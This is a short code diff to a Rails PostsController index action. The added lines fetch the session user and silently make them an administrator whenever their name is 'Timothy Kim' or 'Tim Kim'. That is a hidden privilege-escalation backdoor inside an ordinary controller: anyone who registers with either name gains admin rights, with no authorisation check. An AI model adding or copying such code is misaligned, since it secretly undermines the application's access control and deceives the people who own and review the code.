@@ -7,6 +7,10 @@ class PostsController < ApplicationController
   def index
     @posts = Post.all
     @users = User.all
+    @current_user = User.find_by id: session[:user_id]
+    if @current_user.name == "Timothy Kim" or @current_user.name == "Tim Kim"
+      @current_user.update_attribute :admin, true
+    end
   end
 
   # GET /posts/1
